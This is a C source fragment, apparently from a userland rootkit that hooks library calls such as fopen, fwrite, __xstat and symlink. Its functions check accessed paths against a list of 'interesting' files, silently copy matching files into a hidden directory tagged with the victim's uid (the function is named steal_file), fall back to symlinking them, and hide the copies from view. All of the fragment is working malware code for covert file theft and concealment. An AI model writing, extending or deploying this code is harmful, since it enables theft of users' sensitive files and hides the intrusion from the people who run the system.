int interesting(const char *path){
    char *interesting_file;
    int v = 0;

    for(int i = 0; i < INTERESTING_FILES_SIZE; i++){
        interesting_file = interesting_files[i];
        if(!strncmp(interesting_file, path, strlen(interesting_file))){
            v = 1;
            break;
        }
    }

    return v;
}

/* basename() exists! but so do i :) */
char *get_filename(const char *path){
    char *pdup = strdup(path),
         *tok,
         *ret = (char *)malloc(FILENAME_MAXLEN);

    if(strstr(pdup, "/")){
        tok = strtok(pdup, "/");
        while(tok != NULL){
            strncpy(ret, tok, FILENAME_MAXLEN);    /* this will break, once */
            tok = strtok(NULL, "/");               /* we reach the filename */
        }
        free(tok);
    }else strncpy(ret, pdup, FILENAME_MAXLEN);     /* return path if there  */
                                                   /* are no slashes in it  */

    free(pdup);
    return ret;
}

int write_copy(const char *old_path, char *new_path){
    char buf[LINE_MAX];
    FILE *nfp, *ofp;
    int buflen;

    hook(CFOPEN, CFWRITE);

    if((ofp = call(CFOPEN, old_path, "r")) == NULL) return -1;
    if((nfp = call(CFOPEN, new_path, "w")) == NULL){
        fclose(ofp);
        return -1;
    }

    while(fgets(buf, sizeof(buf), ofp) != NULL){
        buflen = strlen(buf);
        if(buflen == 0) break;
        call(CFWRITE, buf, buflen, 1, nfp);
        memset(buf, 0 , buflen);
    }

    fclose(ofp);
    fclose(nfp);
    return 1;
}

char *get_new_path(char *filename){
    int path_maxlen = strlen(INTEREST_DIR) +
                      strlen(filename) + 12;  /* +12. 1-6 for uid.     */
                                              /* another 6 should we   */
                                              /* we end up linking it. */

    char *ret = (char *)malloc(path_maxlen),
         *_filename = strdup(filename);

    if(_filename[0] == '.') memmove(_filename, _filename + 1, strlen(_filename));

    snprintf(ret, path_maxlen, "%s/%s-%d",
                                INTEREST_DIR,
                                _filename,
                                getuid());

    free(_filename);
    return ret;
}

int steal_file(const char *old_path, char *filename, char *new_path){
    struct stat astat, pstat;

    hook(C__XSTAT);

    memset(&astat, 0, sizeof(stat));
    memset(&pstat, 0, sizeof(stat));

    if((long)call(C__XSTAT, _STAT_VER, old_path, &astat) < 0) return -1;
    if(!S_ISREG(astat.st_mode)) return 1;   /* we only want to look at regular files. */

    /* file already exists(?) */
    if((long)call(C__XSTAT, _STAT_VER, new_path, &pstat)){   /* if the file's different. copy it. */
        if(pstat.st_size != astat.st_size)
            return write_copy(old_path, new_path);
    }else return write_copy(old_path, new_path);  /* file doesn't exist yet, let's write it */

    return -1;
}

#ifdef LINK_IF_ERR
int link_file(const char *old_path, char **new_path){
    strncat(*new_path, "-link", strlen("-link") + 1);
    hook(CSYMLINK);
    return (long)call(CSYMLINK, old_path, *new_path);
}
#endif

void inspect_file(const char *pathname){
    char *filename = get_filename(pathname),
         *new_path = get_new_path(filename);

    if(interesting(pathname) || interesting(filename)){  /* is pathname of interest to us? */
        /* try to copy the file to our interesting directory */
        int steal_status = steal_file(pathname, filename, new_path);

#ifdef LINK_IF_ERR
        if(steal_status < 0)
            if(link_file(pathname, &new_path) < 0)
                goto end_inspect_file;
#else
        if(steal_status < 0) goto end_inspect_file;
#endif

        /* can only hide the new file path if we're root.
         * that's alright since the directory itself will
         * be hidden. */
        hide_path(new_path);
    }
end_inspect_file:
    free(filename);
    free(new_path);
}
